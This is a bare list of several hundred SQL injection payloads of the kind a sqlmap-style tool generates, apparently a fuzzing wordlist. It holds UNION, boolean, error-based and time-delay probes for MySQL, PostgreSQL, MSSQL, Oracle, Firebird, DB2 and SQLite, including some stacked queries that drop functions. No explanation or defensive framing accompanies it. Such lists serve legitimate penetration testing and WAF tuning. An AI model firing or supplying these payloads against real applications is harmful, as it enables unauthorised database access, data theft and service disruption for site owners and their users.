+1' and make_set(2942=8200,8200) and 'jnhv' like 'jnhv
+1%' union all select null,null,null,null,null,null,null#
+1%")) union all select null,null,null,null,null,null,null,null,null,null#
+-1760))) or (8459=8459)*4906 and (((1541=1541
+1") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1' in boolean mode) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+-4001')) or 5634=4044--
+1')) and elt(4460=2665,2665) and (('qmzu'='qmzu
+1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# kfza
+1) union all select null,null,null,null,null,null,null#
+-5073") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ("kbab" like "kbab
+-5800") or 6872=6872 and ("tcab" like "tcab
+1'+(select ejaj where 1651=1651 or 6793=(select 6793 from pg_sleep(5)))+'
+-1869"))) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--
+-2007%')) union all select 7298,7298,7298#
+1")));select benchmark(5000000,md5(0x4c4d6142)) and ((("bqfj" like "bqfj
+-3781) union all select 3916,3916,3916--
+1";iif(5257=5257,1,1/0)
+-9676 or elt(1032=1032,3623)# jcaq
+1");select count(*) from generate_series(1,5000000) and ("kngx" like "kngx
+1")) union all select null,null--
+-4339) where 7178=7178 or 4008=7232
+1') where 2928=2928 and (select * from (select(sleep(5)))gcrr)#
+1%') and 2949=4847 and ('%'='
+1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx
+1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368
+-4586 union all select 2068,2068,2068,2068--
+1%" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1'))) and 7533=7533 and ((('hoyw'='hoyw
+1'+(select qmez where 3729=3729 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+(case when 8422=8452 then 1 else null end)
+1%'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='
+1) where 5598=5598 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+-6086" union all select 8700,8700,8700,8700--
+-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#
+1) as cnpv where 4902=4902 and elt(1210=1210,sleep(5))--
+-4379' union all select 1648,1648,1648,1648,1648,1648,1648#
+1'))) and 1743=6793 and ((('rgcv'='rgcv
+1")) or 8421=(select count(*) from generate_series(1,5000000)) and (("vhey"="vhey
+1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))
+-2548"))) or 5107=8049--
+1')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1")) as lomw where 9257=9257 union all select null,null,null,null,null,null--
+-3362' where 6567=6567 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+-3126)) union all select 6718,6718,6718,6718,6718--
+1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--
+1') as khaa where 8157=8157 and 2388=benchmark(5000000,md5(0x6d457153))#
+1))) and 8635=(select count(*) from generate_series(1,5000000))--
+-7202%")) union all select 2901#
+1) and (3020=3020)*6703 and (9831=9831
+1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('rvwk'='rvwk
+1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('ugrk'='ugrk
+1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('gsjp'='gsjp
+1"))) union all select null,null,null,null,null,null--
+1" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and "bzzt" like "bzzt
+1') and sleep(5) and ('njud'='njud
+1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('nqam'='nqam
+1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'qvyq' like 'qvyq
+-9555'))) or (8459=8459)*4906 and ((('rwpq' like 'rwpq
+1') or (select * from (select(sleep(5)))ydpu) and ('brob'='brob
+-5970' where 2769=2769 union all select 2769--
+-5744) union all select 3617,3617,3617,3617,3617,3617--
+-6987' union all select 4721,4721--
+1) as bidc where 5268=5268 and (select * from (select(sleep(5)))fzno)--
+1))) and elt(3132=1541,1541) and (((4258=4258
+1%"));begin user_lock.sleep(5); end--
+1")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((("mubt"="mubt
+1'))) and 6991=5579
+1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs
+-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1")) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (("duuw"="duuw
+-1844') union all select 9572,9572,9572,9572#
+1';iif(5257=5257,1,1/0)
+1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+-6662")) union all select 6755--
+1);call regexp_substring(repeat(right(char(3702),0),500000000),null)
+1'));begin dbms_lock.sleep(5); end and (('vkle'='vkle
+1%') or 6793=(select 6793 from pg_sleep(5)) and ('%'='
+-7686%") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1' where 3760=3760 union all select null,null,null,null,null,null,null,null#
+-8341 or 8571=8571--
+1") where 7753=7753;select pg_sleep(5)--
+1")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1)) union all select null,null,null,null,null,null,null,null--
+1')) and make_set(1002=3556,3556) and (('mfao'='mfao
+1') and 4595=4595#
+1")) as pafp where 6770=6770 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# miji
+1" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and "wtkx"="wtkx
+1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'yvxg'='yvxg
+1") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1") where 3727=3727 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1%')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('%'='
+1");call regexp_substring(repeat(right(char(3702),0),500000000),null) and ("nwjv"="nwjv
+1") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1') where 6248=6248 and 2388=benchmark(5000000,md5(0x6d457153))#
+1%" waitfor delay '0:0:5'--
+1')) as tcby where 5213=5213;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)
+1 rlike sleep(5)
+1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'rupq'='rupq
+1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn
+1%') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('%'='
+1%"))) and 8635=(select count(*) from generate_series(1,5000000))--
+-6809")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (("nfnf"="nfnf
+-1418") where 7528=7528 order by 1#
+1;select case when 7717=7717 then 1 else null end--
+1%")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'hofy' like 'hofy
+1') as knxr where 5662=5662 union all select null,null,null,null,null,null,null,null#
+1';select benchmark(5000000,md5(0x4c4d6142)) and 'nlrk' like 'nlrk
+1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294
+1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)
+1'||(select 'skds' from dual where 8594=8594 and make_set(6779=2027,2027))||'
+1')) as vdhw where 8858=8858 order by 1#
+1%"))) rlike (select * from (select(sleep(5)))sgvo) and ((("%"="
+1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'='
+1 or elt(6272=6272,sleep(5))-- ilfc
+1',updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)
+-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo
+-2216") where 6692=6692 union all select 6692,6692,6692#
+-1908'))) union all select 7665#
+1");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1") where 6236=6236 or 8514=benchmark(5000000,md5(0x544d5a4c))#
+1%'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1) where 7600=7600 union all select null,null,null,null,null,null--
+1'||(select 'cozi' from dual where 2607=2607 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1;iif(5257=5257,1,1/0)
+1") as drrx where 8633=8633 union all select null,null,null--
+1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('gsdq'='gsdq
+1' and 7528=2894 and 'qoyw'='qoyw
+1') and make_set(8403=8403,8899) and ('dhoo' like 'dhoo
+1")) as uxnc where 8041=8041 and 9198=9198--
+1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+-7412") as qngt where 2041=2041 union all select 2041--
+-5124'+(select 'xpww' where 1752=1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--
+1',(select (case when (7616=7616) then 1 else 1/(select 0) end))
+1")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--
+1'||(select 'hwdj' where 8179=8179;iif(3447=1084,1,1/0)
+1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--
+-9854) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (5696=5696
+(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end))
+1%' order by 1--
+1' in boolean mode) and 7533=7533#
+1") as ybkp where 7788=7788 or 8466=benchmark(5000000,md5(0x694a4745))--
+1%')) union all select null,null,null,null,null#
+1) union all select null,null,null,null,null,null,null,null,null--
+-4945 or make_set(9354=9354,7185)
+1)) and 8635=(select count(*) from generate_series(1,5000000))--
+1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv
+1')) union all select null,null,null,null,null--
+1' where 1593=1593;begin user_lock.sleep(5); end--
+1'))) and (select * from (select(sleep(5)))fzno) and ((('lajk'='lajk
+1" rlike (select * from (select(sleep(5)))sgvo) and "wcze"="wcze
+1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--
+1'))) and 5615=5458--
+1)) and 7533=7533 and ((8738=8738
+1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('diyb' like 'diyb
+1');select * from generate_series(7494,7494,case when (7494=7854) then 1 else 0 end) limit 1--
+1%' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+-4208%'))) or 1133=9010--
+1)) union all select null,null,null,null,null,null,null--
+1%" and 2006=2006
+-9111" or 3038=3038
+1) or 8421=(select count(*) from generate_series(1,5000000)) and (5215=5215
+1");select (case when (4415=2051) then 4415 else cast(1 as int)/(select 0 from dual) end) from dual--
+-1868)) union all select 1859,1859--
+1" union all select null,null,null,null,null--
+1%"))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((("%"="
+1%'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='
+1'))) and make_set(8403=8403,8899) and ((('llfp'='llfp
+-7941 or (5822=8754)*8754-- eepn
+1%" or elt(5873=5873,sleep(5))#
+-9008') union all select 4976,4976,4976,4976#
+1%"))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1%") and make_set(9956=1060,1060) and ("%"="
+-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--
+-5622" where 7970=7970 union all select 7970,7970,7970,7970,7970--
+1") as rdvm where 6360=6360 and sleep(5)--
+-7433")) as zsnt where 2513=2513 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+-3566' where 3641=3641 union all select 3641,3641,3641,3641,3641#
+1') where 5280=5280 and 4595=4595#
+1) as wokl where 1368=1368 union all select null,null,null,null,null,null--
+-7041"))) union all select 2159,2159,2159,2159,2159--
+1 union all select null,null,null,null,null,null,null,null,null,null#
+1" where 4294=4294 and make_set(2543=7988,7988)--
+1)) waitfor delay '0:0:5'--
+1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+-5918') as olzc where 5992=5992 or 4390=9085
+-7430') as xfah where 1596=1596 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+-3834')) as hhiy where 2086=2086 or 3038=3038
+-2211" or 2113=8885#
+1'+(select gajr where 6653=6653 union all select null,null,null,null#
+1')));if(9431=6730) select 9431 else drop function xbkh--
+1%' rlike (select * from (select(sleep(5)))sgvo) and '%'='
+1") where 3679=3679;waitfor delay '0:0:5'--
+1)) and make_set(8403=8403,8899) and ((4686=4686
+1';select case when 6555=7349 then 1 else null end--
+-8976%"))) union all select 5146,5146,5146,5146,5146,5146,5146,5146--
+1%")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((("%"="
+1") where 5197=5197 and elt(3114=3114,sleep(5))#
+1%')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('%'='
+-9347') union all select 3884,3884#
+1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+1') where 2443=2443 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--
+-3790") as ojgb where 5925=5925 union all select 5925,5925#
+1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='
+-1711) where 9098=9098 order by 1#
+1")) and (3020=3020)*6703 and (("njdx" like "njdx
+1")) as nhus where 3689=3689;if(4135=2165) select 4135 else drop function otyy--
+-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1"));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (("sfnj" like "sfnj
+1%" and 8635=(select count(*) from generate_series(1,5000000))--
+-4892%')) or 2251=9881--
+1"))) and (7758=4628)*4628 and ((("wzas"="wzas
+1";select pg_sleep(5) and "ilyw" like "ilyw
+1") where 4971=4971 and 3824=benchmark(5000000,md5(0x76555642))--
+1'))) waitfor delay '0:0:5' and ((('clcf'='clcf
+1;begin user_lock.sleep(5); end
+1");select sleep(5) and ("tlbj" like "tlbj
+1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#
+1"))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((("fktl"="fktl
+1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#
+1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--
+1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1 where 1299=1299;select count(*) from generate_series(1,5000000)--
+1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='
+1,(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+1") where 4588=4588;begin dbms_lock.sleep(5); end--
+-9558"))) union all select 2935,2935,2935,2935,2935--
+1') where 3636=3636 or 4240=(select 4240 from pg_sleep(5))--
+1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg
+-6755) or 9323=9323#
+1'||(select 'xuof' from dual where 8794=8794 or 8156=(select count(*) from generate_series(1,5000000))--
+1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'
+1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('qdhz'='qdhz
+-8005") union all select 5213,5213,5213,5213,5213--
+1") as fcrx where 2929=2929 and 2820=5133
+1" where 6325=6325 union all select null,null,null,null,null,null,null,null,null,null#
+1%")) and 8407=(select count(*) from generate_series(1,5000000)) and (("%"="
+1)) and elt(4249=4249,7259) and ((5683=5683
+1" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+1'))) union all select null,null,null,null,null,null,null,null,null,null--
+1'+(select 'ycsv' where 3628=3628 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'
+1%')));begin user_lock.sleep(5); end and ((('%'='
+1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450
+-1678" where 3706=3706 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1')) as mqnv where 9831=9831;select (case when (4994=1572) then 4994 else 4994*(select 4994 from mysql.db) end)#
+1%";call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+(updatexml(8862,concat(0x2e,0x7171706a71,(select (elt(8862=8862,1))),0x717a767a71),8981))
+1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--
+1')) union all select null--
+1%" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1")) and 2006=2006
+1') union all select null,null,null,null,null,null,null,null--
+-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--
+1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1') as jxtg where 1071=1071 and sleep(5)--
+1' in boolean mode) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))#
+1'))) union all select null,null,null,null,null,null,null,null,null,null#
+-7194'||(select 'gbrx' from dual where 6205=6205 union all select 6205,6205,6205,6205,6205,6205,6205#
+1) rlike (select * from (select(sleep(5)))sgvo)
+1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))
+-1844"))) or make_set(9354=9354,7185) and ((("abdw" like "abdw
+1'))) union all select null,null,null,null,null,null,null,null#
+-7963'+(select 'kxzh' where 7039=7039 union all select 7039,7039,7039,7039,7039,7039--
+-9039') union all select 8058,8058,8058,8058,8058--
+-7868' in boolean mode) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#
+1) and 8594=(select 8594 from pg_sleep(5))--
+1'||(select 'fqoz' where 9794=9794 union all select null,null,null,null,null--
+-5615') where 5931=5931 or 8450=9229
+1) as iiku where 9466=9466;select (case when (5847=2826) then 5847 else cast(1 as int)/(select 0 from dual) end) from dual--
+1) as imdt where 6431=6431;begin user_lock.sleep(5); end--
+1%') or 4240=(select 4240 from pg_sleep(5))--
+1)));(select * from (select(sleep(5)))acdk)#
+1%"))) union all select null,null,null,null,null#
+1%") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ("%"="
+-1337") union all select 7508--
+1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru
+1%";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and "%"="
+-6942') union all select 7280,7280,7280#
+1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('qfls'='qfls
+1'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+-5640")) or 9792=2728--
+1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)
+1"))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((("djrh"="djrh
+1%") and sleep(5) and ("%"="
+1%"));select pg_sleep(5)--
+-7923")) or make_set(9354=9354,7185) and (("szct"="szct
+1")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ("mrsl"="mrsl
+1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('eihl'='eihl
+1"))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((("jmjr" like "jmjr
+1' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1') or elt(6272=6272,sleep(5))
+1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))
+1' where 7464=7464 and 2388=benchmark(5000000,md5(0x6d457153))#
+-2340%" order by 1#
+1 where 6494=6494 and 8463=2760
+1" where 2547=2547 or sleep(5)#
+1%')) union all select null,null,null,null--
+1")) as jrld where 3488=3488;call regexp_substring(repeat(right(char(3702),0),500000000),null)--
+-4104%' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'='
+1)) and 4637=1408 and ((6509=6509
+-2530%' order by 1#
+1'+(select wpai where 3685=3685;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-1844" where 7948=7948 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='
+1") where 5491=5491;begin user_lock.sleep(5); end--
+1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--
+-9959") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ("vcwc"="vcwc
+select 'qqpjq'||(select (case when (2933=2933) then 1 else 0 end))||'qzvzq'
+-4031"))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((("auhn"="auhn
+1" and 9198=9198--
+1')) as qovd where 8865=8865 and (3020=3020)*6703--
+1)) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((9333=9333
+-8069')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('qbvz'='qbvz
+1"));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1) as nioj where 9703=9703;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+-4993" union all select 6959,6959,6959--
+1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--
+1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-6970")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (("dyrq" like "dyrq
+1";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and "kndm"="kndm
+1');select (case when (4297=9086) then 4297 else 1/(select 0) end)--
